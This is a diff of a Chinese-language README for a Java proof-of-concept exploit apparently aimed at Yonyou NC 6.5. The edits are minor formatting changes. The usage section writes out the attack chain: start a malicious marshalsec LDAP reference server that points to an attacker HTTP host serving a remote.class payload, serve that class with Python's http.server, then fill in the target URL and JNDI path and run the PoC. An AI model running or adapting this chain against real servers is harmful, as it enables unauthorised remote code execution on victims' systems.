@@ -44,7 +44,6 @@ public class poc {
 - ncdepend.jar
 - log4j-1.2.15.jar
 - log.jar
-
 - 部分依赖jar包在安装完nc6.5系统后，一般在`C://yonyou//home//lib//`目录下，前提需要有nc6.5的安装包；或者下载仓库内的依赖包：
     - *[点击以了解yonyou-nc6.5-lib](https://github.com/Bin4xin/bigger-than-bigger/blob/master/yonyou-nc6.5-lib/README.MD)*
         - 本机运行环境
@@ -95,17 +94,14 @@ public class remote implements ObjectFactory, Serializable {
 
 ### 0x03：使用方法
 
-- jetbrains IDEA ：`file -> New -> Project -> Java`
+- Jetbrains IDEA ：`file -> New -> Project -> Java`
     - *[点击以了解IDEA运行JAVA项目DEMO](https://blog.csdn.net/oschina_41790905/article/details/79475187)*
     - `src目录 -> New -> Java Class -> poc.java`即可；
     - `Project Structure -> Librabries -> + `添加lib文件夹即可；
-
 - 恶意LDAP：`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.1.2:8000/#remote" 1099`
     - *[点击以了解marshalsec](https://github.com/mbechler/marshalsec)*
 - HTTP SERVER(remote.class)：`python3 -m http.server`
-
 - 填入主方法下`attck url & jndipath` -> `run poc.main()`即可。
-
 - enjoy.
 
 ### 0x04：参考链接
